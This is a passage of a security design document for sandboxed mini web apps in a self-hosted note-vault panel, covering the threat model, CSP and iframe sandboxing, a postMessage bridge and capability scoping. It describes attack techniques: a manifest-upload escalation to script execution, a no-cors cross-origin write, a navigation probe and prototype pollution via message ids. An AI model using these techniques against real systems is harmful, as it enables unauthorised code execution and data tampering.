# Tricks — mini apps in the panel

**v2. Supersedes the v1 fixed-vocabulary design**, which is described here
only where migration needs it. Rewritten in place rather than added
alongside: `README.md`, `vault-template/CLAUDE.md`,
`vault-template/.claude/skills/trick-creator/SKILL.md`,
`panel/server/src/tricks.ts` and several `docs/log.md` entries all point at
this path, and a stable path is worth more than preserving prose that is no
longer the design. What survived from v1 is carried forward in substance,
not by reference — in particular the whole `correr_script` trust boundary.

Read `README.md`'s five rules first, especially **rule 3 (no
authentication — the tailnet is the perimeter)**. Every shape in this
document is that rule applied to "a trick is an arbitrary web app."

---

## 1. What a trick is now

A **trick** is a folder containing a real web app plus a manifest that says
what that app may touch. The app is arbitrary files: any HTML, any CSS, any
JavaScript, canvas, SVG, drag-and-drop, a chart drawn by hand, a game, a
calculator, whatever the author imagines. There is **no widget vocabulary
to compose and no primitive to add** — that constraint is gone.

The app runs in an iframe on an **opaque origin**, with no network access
of its own, and reaches the vault only through a `postMessage` bridge
scoped to the capabilities its manifest declares. An agent creates one by
writing files (rule 2); the files are the only state (rule 1).

What v1 was, and why it went:

> v1 shipped a fixed set of controls — `lista`, `boton`, `texto`,
> `checkbox`, `fecha`, `select`, `formulario` — because "rendering
> arbitrary JavaScript that anything on the tailnet can write" was judged
> the same risk class as running it on the panel's origin. That judgement
> conflated two different things. Arbitrary JavaScript is only dangerous
> *where it runs*. Run on an opaque origin with no network and no vault
> handle, it is as harmless as arbitrary markdown, and it is exactly as
> expressive as the author wants. v1's vocabulary bought safety it did not
> need to buy, and paid for it by making a whole class of requests
> ("a chart", "a drawing pad", "a kanban board") answerable only with
> "tricks can't do that."

The hard requirement is unchanged and non-negotiable: **trick JavaScript
must never execute on the panel's origin.** Everything in §4 and §5 exists
to make that true, and to keep it true when someone adds a feature later.

---

## 2. Threat model

### 2.1 What the attacker gets for free

There is no authentication. Anything that can reach the tailnet address can
already call every endpoint the panel exposes — read every note, write
every note, list tricks, and `POST /api/tricks/:name/run`. That is the
baseline, and no part of this design improves it; `panel/deploy/README.md`
is where the "don't expose this publicly" warning lives.

So the interesting question is never "can something on the tailnet read a
note." It is: **can code that arrived as a trick's app file do more than an
HTTP client on the tailnet could already do?** Three things would qualify:

1. **Running on the panel's origin.** Then it reads the panel's
   `localStorage`, its cookies, the DOM of every open note, and issues
   same-origin `/api/*` calls whose responses it can read. That is a real
   escalation over "an HTTP client on the tailnet," because it is inside
   the user's browser session, on their machine, at a moment they trust
   the page.
2. **Talking to the outside world.** A tailnet-side HTTP client can read
   the vault but has to get the data out itself. Trick code running in the
   user's browser sits behind whatever the user's browser can reach — the
   corporate LAN, other tailnet nodes, the open internet. Exfiltration is
   an escalation.
3. **Taking over the tab.** Navigating the top-level window, opening
   popups, or drawing a full-page overlay that impersonates the panel.

### 2.2 Two trust levels that must not be confused

| Who | How they act | What they may do |
|---|---|---|
| **A filesystem author** — a human at a shell, Claude Code in the vault, a cron job | Writes files directly | Anything. They can already run code on the box. Declaring a script or an app is within their existing power. |
| **A network client** — a browser on the tailnet, a trick's own JavaScript, a script hitting `/api/*` | HTTP requests to the panel | Only what an endpoint deliberately allows. Must **never** be able to place or modify a file under `.claude/`. |

Everything under `.claude/` — `trick.yaml`, `SKILL.md`, `app/**`, `*.sh`,
`jobs/*.sh` — is **executable configuration, not content**. A manifest is
not a document that happens to be YAML; it is the input to a code-execution
decision. An app file is not a document that happens to be HTML; it is code
the panel will hand to a browser and tell it to run.

### 2.3 The escalation that proves the point

Found 2026-08-15 while attacking the new attachment upload endpoint, and
the reason §2.2 is written as a table instead of a sentence:

> Upload a `trick.yaml` into `.claude/tricks/<name>/` naming an
> already-executable script with attacker-chosen `args`, then
> `POST /api/tricks/:name/run`. It executed, and wrote outside the vault.
> **No path traversal was involved** — the file lands inside the vault and
> passes every location check `tricks.ts` performs.

Nothing in `tricks.ts` was wrong. Its stated property — *the client selects
which pre-declared script runs, never what runs* — silently rested on an
unstated premise: **that declaring a script required filesystem access.**
A new endpoint that could place a file removed the premise, and the
property evaporated without a single line of the old code changing.

Same class, same day: `.git/config` and `.obsidian/plugins/` are also "just
files" that other software executes. All are now refused by the upload
endpoint.

**The general rule, stated once so the next person adding a write path
re-derives it rather than rediscovers it:**

> A security property that depends on an unstated premise about *who can
> write a file* is not enforced. It is assumed. Any new endpoint that can
> place a file on disk invalidates every such premise in the codebase until
> it is checked against each one. When you add a write path, the question
> is not "is my path check correct" — it is "what does the rest of this
> system believe about who could have written this file, and is that still
> true?"

This applies to future endpoints nobody has thought of yet: a git-pull
button, an import, a sync daemon, a "restore from backup." Each one is a
new way for a network client to become a filesystem author, and each one
must refuse `.claude/`.

### 2.4 What the sandbox does and does not protect

It **does** stop trick code from reading the panel's origin, reaching the
network, writing outside its declared scope, running an undeclared script,
navigating the tab, or impersonating another trick to the host. All
verified — §10.

It **does not** stop:

- **A malicious trick author.** Whoever can write `.claude/tricks/x/app/`
  can already run code on the box. The sandbox limits what the *browser*
  does, not what the author could do anyway.
- **A trick lying to the user inside its own rectangle.** A trick can draw
  a convincing fake. Mitigation is presentation: the panel frames a trick
  with its own visible chrome (name and "mini app" label outside the
  iframe), and the iframe never occupies the full viewport.
- **Denial of service inside the tab.** A trick can burn CPU or spin the
  bridge. Mitigated by rate limits (§6.6), not eliminated.
- **Anything above the browser.** Rule 3 still holds.

---

## 3. File layout

```
.claude/tricks/<trick-name>/
├── trick.yaml          the manifest — §4
├── SKILL.md            optional: a normal Claude Code skill, so the same
│                        thing is usable in chat as well as in the panel
├── app/                the mini app. Arbitrary files. index.html plus
│   ├── index.html       whatever it references, any depth.
│   ├── app.js
│   ├── style.css
│   └── logo.png
├── data/               optional: the trick's own notes/files
└── *.sh                optional: scripts a `correr_script` action names
```

`app/` is the served root. Nothing outside `app/` is ever reachable over
HTTP by the frame, and paths are resolved with the same discipline
`safeScriptPath` uses (§5.3).

`<trick-name>` is a single path segment — `safeTrickName` in
`panel/server/src/tricks.ts` already enforces this and is unchanged.

---

## 4. `trick.yaml` — the manifest

```yaml
titulo: "Gastos del mes"
descripcion: "Registro rápido de gastos, con gráfica."
icono: "💸"

app:
  entrada: "index.html"        # optional, default "index.html"
  alto: 520                    # optional, iframe height in CSS px, default 480
                               # (width is always the panel's content column)

capacidades:
  vault.query:
    carpeta: ".claude/tricks/gastos/data"
    frontmatter: { tipo: gasto }
    campos: [path, titulo, frontmatter.monto, frontmatter.fecha]
    limite: 500
  vault.read:
    carpeta: ".claude/tricks/gastos/data"
  vault.write:
    carpeta: ".claude/tricks/gastos/data"
    crear: true
    campos: [monto, fecha, categoria]
    cuerpo: false
  estado:
    max_bytes: 65536
  script.run:
    acciones: [0]

acciones:
  - etiqueta: "Regenerar el resumen"
    control: boton
    accion:
      correr_script:
        ruta: ".claude/tricks/gastos/resumen.sh"
        args: []

programacion:
  cron: "0 7 * * *"
  accion: revisar_vencidos
  requiere_llm: false
```

### 4.1 Validation rules (server-side, at read time)

`readTrickManifest` in `panel/server/src/tricks.ts` grows these. A manifest
that fails any of them is **invalid**, meaning: skipped in the listing with
a logged reason, and 404 on the detail route — the existing
degrade-gracefully behaviour, unchanged.

| Field | Rule |
|---|---|
| `titulo` | required, string |
| `app` | optional. Present ⇒ the trick is an app trick. Absent ⇒ legacy v1 (§9) |
| `app.entrada` | single relative path, no `..`, must resolve under `app/`, must end `.html` |
| `app.alto` | integer 120–2000 |
| `capacidades` | optional map. **Absent or empty means the app gets no bridge at all** — a perfectly good state for a purely visual trick |
| `capacidades.*` | every key must be a known capability name (§7). An unknown name invalidates the manifest — silently ignoring it is how a typo becomes "why doesn't my app work" |
| `*.carpeta` | required for `vault.*`. Vault-relative, no `..`, no leading `/`. **`""`, `"."` and `"/"` are refused** — "the whole vault" is not a capability |
| `vault.write.carpeta` | additionally: must not resolve under `.claude/` **unless** it is exactly `.claude/tricks/<this trick>/data` or below it |
| `acciones` | unchanged from v1 |
| `programacion` | unchanged from v1 — still a declaration, not an installation (§8) |

Manifests are read fresh from disk on every request that depends on them.
Never cached, never taken from a request body. This is already how
`runTrickAction` works and it is the reason the client can only ever select
an index.

---

## 5. Getting the app into an opaque origin

This is the crux. Naming the problem precisely: serving
`.claude/tricks/<name>/app/index.html` from an ordinary endpoint puts the
document on the **panel's origin**, which is the one thing that must not
happen. Four approaches were considered and three were measured.

### 5.1 The decision

**Serve the app's real files from a real, hierarchical URL on the panel's
own port, and make the response itself opaque-origin with
`Content-Security-Policy: sandbox`.** Embed it with
`<iframe sandbox="allow-scripts">`, which independently forces an opaque
origin for the nested case.

```
GET /api/tricks/<name>/app/            → app/index.html
GET /api/tricks/<name>/app/style.css   → app/style.css
GET /api/tricks/<name>/app/img/x.png   → app/img/x.png
```

Two independent mechanisms produce the opaque origin, and either alone is
sufficient for the in-panel case:

- the **iframe `sandbox` attribute** without `allow-same-origin`, which is
  what the panel controls, and
- the **`Content-Security-Policy: sandbox` response header**, which travels
  with the bytes and so also applies if the document is ever loaded outside
  our iframe.

Belt and braces on purpose. A future refactor that forgets one still has
the other, and the failure mode of forgetting both is catastrophic and
silent.

> **`allow-scripts` together with `allow-same-origin` is not a sandbox.**
> A frame with both can reach `window.frameElement`, remove its own
> `sandbox` attribute, and reload itself unsandboxed on the parent's
> origin. The combination must never appear in this codebase, in any file,
> for any reason. If a future change seems to need it, the change is wrong.
> Verified from the other side in §10: without `allow-same-origin`,
> `window.frameElement` is `null`.

### 5.2 Why not the alternatives

| Approach | Result | Verdict |
|---|---|---|
| **`srcdoc`** with the HTML inlined | Document URL is `about:srcdoc`; origin is opaque, correctly. But relative URLs resolve against the **parent document's** base URL. Measured: `<script src="altprobe.js">` inside a `srcdoc` frame requested `/altprobe.js` — the panel's root — and 404'd. `<script src="/api/tricks/pinta/app/altprobe.js">` did run. | **Rejected.** It only works if a server-side rewriter turns every relative reference into an absolute one, across `<script src>`, `<link href>`, `<img src>`, `<source>`, `srcset`, CSS `url()`, `@import`, inline `style` attributes, module specifiers, and any URL a script builds at runtime. That last one is unfixable. "No constraints" and "an HTML rewriter has to understand your app" are incompatible. |
| **`blob:` URL** as the iframe `src` | The frame loads and is opaque-origin. But a `blob:` URL has an opaque path, so **no** path-based reference resolves. Measured: the frame produced **zero** subresource requests — the absolute path that worked under `srcdoc` did not even reach the server. | **Rejected.** Strictly worse than `srcdoc`: it breaks relative *and* absolute references. |
| **Service worker** serving the app | A document on an opaque origin has no storage key and is not controlled by a service worker; registration would have to happen on the panel's origin, which is the thing we are avoiding. | **Rejected**, not measured — the mechanism is structurally unavailable. |
| **A second port / second origin** | A different port is a different origin, so no `localStorage`, no `parent.document`. But it does **not** stop the frame reaching the API. Measured, in the `netprobe` case: with `connect-src` permitted, a cross-origin `fetch(..., {mode:"no-cors"})` POST **reached the server and wrote to the vault**. CORS protects the *response*, not the *request*. | **Rejected.** It also costs a second listener, a second `ufw` rule, deployment doc churn, and gives every trick a shared origin (trick A reads trick B's storage). It buys less than the chosen approach and costs more. |
| **Chosen: real URLs + CSP sandbox + iframe sandbox** | Relative URLs, subfolders, images, stylesheets, classic scripts, ES modules, dynamic `import()`, blob Workers and canvas all work. Verified in §10. | **Chosen.** |

### 5.3 Exact server behaviour for `GET /api/tricks/:name/app/*`

**Path resolution.** `name` through `safeTrickName`. The remainder is
URL-decoded, then joined onto `<vault>/.claude/tricks/<name>/app` and
normalized; if the result is not the app root or under it, **400**. Same
shape as `safeScriptPath`, one level deeper. An empty remainder means
`app.entrada`. A remainder ending in `/` means that folder's `index.html`.

**Who may load the entry document.** Measured discriminators (§10.6):

| Request | `Sec-Fetch-Dest` | `Sec-Fetch-Site` |
|---|---|---|
| Panel mounts the app in its iframe | `iframe` | `same-origin` |
| User opens the app URL in a tab | `document` | `none` |
| A trick frame navigates *itself* to a trick app | `iframe` | `cross-site` (its initiator origin is opaque) |
| The app's own subresources | `script`/`style`/`image`/… | `cross-site` (same reason) |

So:

```
dest ∈ {iframe, frame}      → require site == "same-origin", else 403
dest == "document"          → 403
dest absent                 → 403
otherwise (subresource)     → serve; do NOT check Sec-Fetch-Site
```

That single rule closes two holes at once: a trick app opened top-level,
and one trick frame navigating into another trick's app. **Do not add a
`Sec-Fetch-Site` check to subresources** — it 403s every asset the app
loads, and because the 403 body is JSON with `nosniff`, the symptom is
"my scripts are fetched but never execute," which cost real time to
diagnose during this design (§10.6). Leave the comment in the code.

`dest absent → 403` makes this fail closed for clients that do not send
`Sec-Fetch-*` (curl, and browsers older than roughly 2023). A trick app
that does not render is the correct failure; a trick app served to an
unidentifiable client is not.

**Response headers**, on every file served from `app/`:

```
Content-Type:                <from an extension allowlist; never sniffed>
X-Content-Type-Options:      nosniff
Cache-Control:               no-store
Access-Control-Allow-Origin: *
Content-Security-Policy:     sandbox allow-scripts;
                             default-src 'none';
                             script-src 'self' 'unsafe-inline' 'unsafe-eval';
                             style-src 'self' 'unsafe-inline';
                             img-src 'self' data: blob:;
                             font-src 'self' data:;
                             media-src 'self' data: blob:;
                             worker-src blob:;
                             connect-src 'none';
                             form-action 'none';
                             base-uri 'none';
                             frame-src 'none';
                             object-src 'none'
```

Notes, each load-bearing:

- **`sandbox allow-scripts`** and nothing else. Not `allow-same-origin`
  (§5.1). Not `allow-top-navigation`, `allow-top-navigation-by-user-activation`,
  `allow-popups`, `allow-forms`, `allow-modals`, or `allow-downloads`. The
  absence of `allow-forms` is what stops a form POST reaching `/api/*`
  (§10.4) — it is not decorative.
- **`'self'` works here**, which is counter-intuitive and was verified
  rather than assumed: the document's *origin* is opaque, but CSP `'self'`
  matches against the document's **URL** origin, which is the panel's.
  Measured: a `'self'`-only policy ran the app's own script and refused an
  otherwise identical script from a different origin (§10.5). Using
  `'self'` rather than an origin computed from the `Host` header also means
  the policy does not depend on a client-supplied header.
- **`connect-src 'none'`** is the single most important directive. It is
  what makes the API unreachable from the frame *at all*, rather than
  merely unreadable. Without it, an opaque origin can still issue a CORS
  "simple request" POST that the server executes (§10.3). Never relax it.
- **`Access-Control-Allow-Origin: *`** on app files only, never on `/api/*`
  data routes. Without it, `<script type="module">` cannot load — module
  scripts are always fetched in CORS mode, and the frame's origin is
  opaque, so there is nothing for the browser to match. With it, modules,
  dynamic `import()` (given `crossorigin` on the entry script), and
  `<script crossorigin>` all work (§10.2). It does **not** reopen anything:
  `connect-src 'none'` still stops the frame doing anything with a fetch.
  The residual cost is that any page that can reach the tailnet address can
  read a trick's app source — non-secret code, and already readable by
  anything that can reach the API at all.
- **`'unsafe-inline'` and `'unsafe-eval'`** are granted deliberately. CSP
  inside the sandbox is a second fence, not the fence; hardening against
  XSS *within* an origin whose whole purpose is to run the author's
  arbitrary code buys nothing, and forbidding inline scripts would break
  the single-file apps this design exists to enable.

### 5.4 The panel's own CSP

The panel's `index.html` must be served with:

```
Content-Security-Policy: default-src 'self';
                         frame-src 'self';
                         connect-src 'self';
                         img-src 'self' data: blob:;
                         style-src 'self' 'unsafe-inline';
                         object-src 'none';
                         base-uri 'self';
                         form-action 'self'
```

**`frame-src 'self'` is a security control, not hygiene.** A sandboxed
frame may navigate *itself*; `allow-top-navigation` governs only the top
window. `frame-src` on the *embedding* page governs what URL the nested
document may become, whoever initiated the navigation. It is what
guarantees the frame can never turn into a foreign origin — which in turn
is what makes it safe for the host to send the bridge port with
`targetOrigin: "*"` (§6.2). Verified: a frame's attempt to navigate itself
to `http://example.com/pwned` produced no network request (§10.6).

> **Consequence for the frontend build, measured 2026-08-15 rather than
> predicted:** this policy has no `'unsafe-inline'` for scripts, so an
> inline `<script>` in the panel's `index.html` **does not run** — found
> by writing a probe page with an inline script against the real server
> and getting a blank page and no console error worth the name. Vite's
> default build is external-script-only and is fine; anything that wants
> an inline bootstrap needs a nonce, not `'unsafe-inline'`. This is served
> as a response header by `@fastify/static`'s `setHeaders`, on `.html`
> only — a CSP on a `.js` response governs nothing.

---

## 6. The bridge

### 6.1 Shape

One `MessageChannel` per mounted frame. The host keeps `port1`; `port2` is
transferred to the frame once. Every protocol message after the handshake
travels on that port. The frame never holds a URL, a token, or a `fetch` it
controls — it holds a port.

### 6.2 Mount sequence, exactly

Host side:

1. Create `<iframe sandbox="allow-scripts" referrerpolicy="no-referrer"
   src="/api/tricks/<name>/app/" title="<titulo>">`. Set no other sandbox
   token, ever.
2. On the **first** `load` event, and only the first:
   - `const ch = new MessageChannel()`
   - `ch.port1.onmessage = handler bound to <name>`
   - `iframe.contentWindow.postMessage(hello, "*", [ch.port2])`
3. On **any subsequent `load` event on the same element**: the frame
   navigated itself. Do not create a port. Remove the iframe, close
   `port1`, and render "this trick navigated away from its app" in its
   place. Verified necessary and verified effective (§10.7).

`targetOrigin` must be `"*"`. An opaque origin has no name;
`postMessage(msg, "null")` throws a `SyntaxError`. Three things make that
acceptable, and all three must hold together: the host owns the
`contentWindow` reference; the panel's `frame-src 'self'` means the frame
can only ever be a panel-origin document; and a second `load` never
receives a port.

The hello message — the only `window`-level message in the protocol:

```json
{
  "raymond": "trick-bridge",
  "v": 1,
  "trick": "gastos",
  "capacidades": ["vault.query", "vault.read", "vault.write", "estado", "script.run"],
  "tema": "oscuro",
  "locale": "es-CO"
}
```

Frame side:

```js
addEventListener("message", (ev) => {
  if (ev.source !== window.parent) return;          // a sibling frame is not the host
  if (ev.data?.raymond !== "trick-bridge") return;
  const port = ev.ports[0];
  port.onmessage = (e) => { /* responses and events */ };
});
```

### 6.3 What actually authenticates a message

`event.origin` for anything the frame sends is the literal string
`"null"` — verified (§10.1). **Every** opaque-origin document in the
browser reports `"null"`, so it identifies nothing. Do not branch on it,
do not compare it, do not log it as if it meant something.

What authenticates a frame→host message is **the port it arrived on**. The
host created the channel and transferred `port2` to exactly one window. A
port cannot be forged, guessed, or enumerated. Therefore:

- The host binds the trick name to the **port**, in a closure or a `Map`
  keyed by the port. It **ignores any `trick` field in the message body**.
  Verified: the hostile app sent `trick: "pinta"` on its own port and was
  still evaluated as itself (§10.4).
- The host **ignores protocol operations arriving as `window` `message`
  events**. Only the port carries ops. Verified: a direct
  `window.parent.postMessage({op:"vault.write", ...})` was seen and
  discarded (§10.4).
- Symmetrically, the frame accepts the hello only when
  `ev.source === window.parent`. A sibling frame posting to it has
  `ev.source === thatFrame`.

### 6.4 Envelope

Request, frame → host:

```json
{ "v": 1, "id": "q7", "op": "vault.query", "params": { "limite": 50 } }
```

Response, host → frame:

```json
{ "v": 1, "id": "q7", "ok": true,  "result": { "notes": [ … ] } }
{ "v": 1, "id": "q7", "ok": false, "error": { "code": "capability_denied",
                                              "message": "gastos did not declare vault.write" } }
```

Event, host → frame, unsolicited, no `id`:

```json
{ "v": 1, "ev": "datos.cambiaron", "paths": [".claude/tricks/gastos/data/cafe.md"] }
{ "v": 1, "ev": "tema", "valor": "claro" }
```

- `id` is chosen by the frame and echoed verbatim. The host must treat it
  as opaque data: store pending state in a `Map`, never as a property on a
  plain object (`__proto__` as an `id` is free prototype pollution
  otherwise), and never parse it.
- `v` is the protocol version. A message with a missing or unknown `v`, a
  missing `id`, or a non-string `op` is **dropped with a log line**, not
  answered — an answer to a malformed message is a probing oracle.
- Every well-formed request gets exactly one response. The frame should
  time out on its own; the host must also expire pending entries so a
  wedged trick cannot grow the map without bound.

### 6.5 Error codes

| `code` | Meaning |
|---|---|
| `capability_denied` | the op or its scope is not in this trick's manifest |
| `bad_request` | params failed validation |
| `not_found` | the path is in scope but nothing is there |
| `conflict` | a write precondition failed |
| `too_many_requests` | rate limit |
| `unsupported_op` | a valid-looking op this panel version doesn't implement |
| `internal` | anything else; details go to the server log, not to the frame |

**`capability_denied` is always returned, never silently dropped and never
faked as success.** An author debugging their own app has to be able to see
that they forgot a declaration. The panel should also surface it visibly
next to the trick — a trick asking for something it never declared is worth
a human noticing.

Error `message` is for the author. It must never include a filesystem path
outside the trick's own scope, or the content of anything out of scope.

### 6.6 Limits

Enforced by the host, per mounted frame:

- **32** in-flight requests; further requests get `too_many_requests`.
- **20 ops/second**, burst 40 (token bucket).
- **256 KiB** per message, either direction.
- Pending requests expire after **15 s**.

These are ceilings against accident and spin, not against a determined
attacker inside the tab — see §2.4.

### 6.7 Two-layer enforcement

The host frontend validates first: is the envelope well-formed, is the op
one that this trick's declared manifest keys grant (§7's table — `estado`
grants two ops, everything else is one-to-one), is the trick under its rate
limit. This gives fast, precise errors.

**The host is a courier, not the authority.** The server re-derives every
decision from its own fresh read of `trick.yaml`, on every request, and
must reject an out-of-scope request even if the host forwarded it. This is
exactly the discipline `runTrickAction` already applies to `ruta`/`args`,
generalized. A frontend bug must not become a vault-scope bug.

### 6.8 The host↔server transport, and the shapes §6–§7 left open

> **Added 2026-08-15 while implementing seams 1, 3 and 5.** Nothing above
> this line changed: §6.1–§6.7 (envelope, port identity, one port per
> mount) and §7's capability names and scope semantics are exactly as
> written. This section only fills in things that were *unspecified* and
> that two implementers would otherwise guess differently — the authoring
> agent hit six of them writing the starter apps, and each one is settled
> here rather than in a starter's `||` fallback.

**Transport.** `POST /api/tricks/<name>/bridge`, one funnel, carrying the
**same envelope** as §6.4 — the host relays the frame's message rather
than translating it:

```
→  Content-Type: application/json   (required; 415 otherwise)
   { "v": 1, "id": "q7", "op": "vault.query", "params": { … } }

←  { "v": 1, "id": "q7", "ok": true,  "result": { … } }
   { "v": 1, "id": "q7", "ok": false, "error": { "code": …, "message": … } }
```

- **The trick's identity is the URL's `<name>`.** There is no trick field
  in the body to forge, exactly as there is none over `postMessage`
  (§6.3). The host sets it from the frame it mounted.
- **The HTTP status matches the error code** (`capability_denied` → 403,
  `bad_request` → 400, `not_found` → 404, `conflict` → 409,
  `too_many_requests` → 429, `unsupported_op` → 501, `internal` → 500),
  and the body is the envelope regardless. The host must read the body on
  a non-2xx: the status is there so an attack transcript or an access log
  does not read `200 OK` for a refused write, and the `code` in the body
  is the contract.
- **`application/json` is required explicitly**, per §10.3's corollary. A
  cross-origin page can always send a CORS-simple POST with no preflight;
  requiring JSON means it must first pass a preflight this server does not
  answer. That sits behind the cross-site guard in `index.ts` and behind
  the frame's own `connect-src 'none'` — three independent fences, because
  what is on the other side is "write the vault, run a script."
- **256 KiB body limit** (§6.6), enforced by the parser. **20 ops/s,
  burst 40, per trick** is enforced server-side too; the host should still
  do its own, but the host is not the authority and a `curl` caller has no
  host in front of it.

**Wire shapes**, settled:

| op | params | result |
|---|---|---|
| `vault.query` | `{ subcarpeta?, frontmatter?, frontmatter_exists?, sort?, limite? }` | `{ total, notes: [ … ] }` |
| `vault.read` | `{ path }` | `{ path, content }`, plus `{ cuerpo, frontmatter }` for `.md` |
| `vault.write` | `{ path, frontmatter?, cuerpo? }` | `{ path, bytes, created }` |
| `estado.get` | — | `{ valor }`, `null` when unset |
| `estado.set` | `{ valor }` | `{ path, bytes }` |
| `script.run` | `{ indice }` | `{ ok, stdout, stderr, exitCode, timedOut }` |

And the six decisions behind them:

1. **A note summary's title key is `title`, not `titulo`.** §7.1's example
   said `titulo`; the `Note` type, `/api/notes`, the graph and the
   dashboard `columns` all say `title`, and the same paragraph says not to
   fork the dashboard shape — so one had to give, and one example loses to
   five call sites. The manifest's own keys stay Spanish (`carpeta`,
   `campos`, `limite`, `cuerpo`, `valor`, `indice`): those are the
   capability vocabulary, not the note model. `titulo` is still *accepted*
   as an input spelling in `campos` and `sort.field`; the output key is
   always `title`. **§7.1's example is corrected below.**
2. **`vault.write` has no `crear` param.** `crear` is a manifest flag —
   whether creating is allowed is the author's standing decision, not a
   per-call one. The server infers "this is a creation" from the file not
   existing and checks it against the flag; the caller learns which
   happened from `created` in the result.
3. **Setting a frontmatter key to `null` deletes that key.** It is still
   bounded by `campos`, and the file and its history are untouched, so it
   does not cross §7.3's "deletion is not a capability" line.
4. **`estado.get` answers `{ valor }`, not a bare value** — symmetric with
   `set`'s params, and it leaves room for a sibling field later without
   changing the shape of every app that reads it. An unset store is
   `{ valor: null }`, not an error: that is every app's first run.
5. **`vault.read` returns `content` (the file exactly as on disk,
   frontmatter fence and all) plus, for `.md`, the parsed `cuerpo` and
   `frontmatter`.** The parsed halves exist because an app that renders a
   note should not have to carry a YAML parser into a sandbox that cannot
   load one from a CDN. The three names match `vault.write`'s params, so
   read→edit→write needs no translation.
6. **`sort` is `{ field, order }`** — the dashboard `query` widget's shape
   (frontend plan §5.3). `field` is `mtime` | `path` | `title` | `size`,
   or a frontmatter key written either as `frontmatter.<key>` (like
   `columns`) or bare (like the dashboard's own `sort`, which is
   inconsistent with its `columns` and not worth inheriting strictly).
   `order` is `asc` | `desc`. Default: `mtime`, `desc`.

**`trabajo.estado` answers `unsupported_op`** until seam 6 builds it —
not `capability_denied`, which would send an author hunting a manifest bug
that is not there.

---

## 7. Capabilities

`capacidades` is a map. **A capability with no entry is denied.** There is
no ambient authority and no default grant.

This section defines what each capability *means* and what it scopes to.
The exact params and result shape of each op are in **§6.8**, which was
added after this section and does not change anything in it.

The complete vocabulary, and the ops each manifest key grants. Any other
key invalidates the manifest (§4.1):

| Manifest key | Ops it grants |
|---|---|
| `vault.query` | `vault.query` |
| `vault.read` | `vault.read` |
| `vault.write` | `vault.write` |
| `estado` | `estado.get` **and** `estado.set` — one key, two ops, because a store you can write but not read is not a store |
| `script.run` | `script.run` |
| `trabajo.estado` | `trabajo.estado` |

The `capacidades` array in the hello message (§6.2) lists **manifest keys**,
not ops. A frame that wants to feature-detect `estado` checks for
`"estado"`.

### 7.1 `vault.query` — list notes in scope

```yaml
vault.query:
  carpeta: ".claude/tricks/gastos/data"   # required
  frontmatter: { tipo: gasto }            # optional, ALWAYS applied
  frontmatter_exists: [fecha]             # optional, presence check
  campos: [path, title, frontmatter.monto]   # optional projection allowlist
  limite: 500                             # optional, default 200, max 2000
```

*(`title`, not `titulo` — corrected 2026-08-15, see §6.8 decision 1. The
projected note field names are the panel's existing `Note` model, which
is English; the manifest keys around them stay Spanish.)*

Request params may **narrow, never widen**:

- `params.subcarpeta` — must resolve under `carpeta`.
- `params.frontmatter` — ANDed with the manifest's; it cannot remove a
  manifest constraint.
- `params.sort`, `params.limite` — `limite` is clamped to the manifest's.

Result is a list of note summaries restricted to `campos` if given. The
filter shape is deliberately the same flat filter object the dashboard
`query` widget uses (`panel/docs/frontend-implementation-plan.md` §5.3) —
one `DataQuery` type, three renderers. Do not fork it.

### 7.2 `vault.read` — read one file in scope

```yaml
vault.read:
  carpeta: ".claude/tricks/gastos/data"
  extensiones: [".md", ".json", ".csv"]   # optional, default [".md"]
```

`params.path` must pass `safeRelPath`, resolve under `carpeta`, and match
`extensiones`. Anything else is `capability_denied` — not `not_found`,
which would leak whether the file exists.

### 7.3 `vault.write` — write one file in scope

```yaml
vault.write:
  carpeta: ".claude/tricks/gastos/data"
  crear: true          # may it create new files? default false
  campos: [monto, fecha, categoria]   # frontmatter fields it may set
  cuerpo: false        # may it replace the note body? default false
  max_bytes: 262144    # default 256 KiB
```

Server checks, in order, all of them:

1. `safeRelPath`, then under `carpeta`.
2. Not under `.claude/` — **unless** it is under
   `.claude/tricks/<this trick>/data/`. This is the §2.2 rule enforced
   rather than trusted: a trick's browser-side code must never be able to
   write a manifest, a skill, a script, or an app file, including its own.
3. Basename does not begin with `.`; extension in the write allowlist
   (`.md`, `.json`, `.csv`, `.txt`).
4. Creating requires `crear: true`.
5. Frontmatter keys being changed ⊆ `campos`. The merge is read-modify-write
   with `js-yaml`, same mechanism as dashboard row actions.
6. Body replacement requires `cuerpo: true`.
7. Size ≤ `max_bytes`.

**Deletion is not a capability.** A trick archives by setting a field or
moving a file within its own scope. Nothing a trick's browser code does
should be unrecoverable with `git checkout`.

Carried forward honestly from v1: writes are **plain overwrites with no
conflict detection** (plan §5.5, §9). A trick action can clobber a
concurrent edit exactly like a dashboard action can.

### 7.4 `estado` — the app's own persistence

A sandboxed opaque origin has **no `localStorage`, no `sessionStorage`, no
IndexedDB and no Cache Storage** — every one throws `SecurityError`
(verified, §10.1). That is a feature: it means a trick cannot hold state
the user can't see, which is rule 1 enforced by the browser.

```yaml
estado:
  max_bytes: 65536     # default 64 KiB
```

- `estado.get` → the parsed contents of
  `.claude/tricks/<name>/data/estado.json`, or `null`.
- `estado.set` with `params.valor` → writes that file, pretty-printed, with
  a trailing newline so it diffs sanely.

One file, JSON, in the trick's own folder. A person can read it, an agent
can edit it, `git log` records it.

### 7.5 `script.run` — the existing boundary, reached through the bridge

```yaml
script.run:
  acciones: [0, 2]     # indices into this manifest's `acciones`
```

Request: `{ "op": "script.run", "params": { "indice": 0 } }`.

Server: the index must be in `acciones`; the action must exist and be a
`correr_script`; then `runTrickAction` runs **unchanged** — `ruta` and
`args` come from the server's own fresh read of `trick.yaml`, never from
the message. See §11.

### 7.6 `trabajo.estado` — is the job that feeds me healthy?

```yaml
trabajo.estado:
  job: "gastos-nocturno"
```

Returns the last row of the run table in `.claude/jobs/<job>.md`:
`{ timestamp, exitCode, duration, enabled }`. Read-only, one named job, no
globbing. This exists so an app driven by a scheduled run can say "last
updated 07:04, exit 0" instead of silently showing stale data — rule 4's
file trail, surfaced where someone will actually see it. It reads the same
file the planned jobs view reads (`docs/roadmap.md` §10); do not build a
second parser.

---

## 8. Scheduling, and tricks that nobody is watching

README rule 4 was reversed on 2026-08-15: **scheduled unattended runs are a
first-class feature**, and what a run owes is a file trail, not an
approval. Two consequences for tricks specifically:

**A trick's app is a view; a scheduled job is an actor.** A job runs on the
box with filesystem access. It does not go through the bridge and is not
limited by `capacidades`. Say this out loud in any doc that describes
capabilities, because the natural misreading is that `capacidades` is a
description of everything the trick can do. It is not — **`capacidades`
constrains the browser, not the machine.**

**An app must therefore be correct when its data changed while nobody was
looking.** The host polls the trick's declared scope against the vault
index and emits `datos.cambiaron` (§6.4) — every 5 s while the trick is
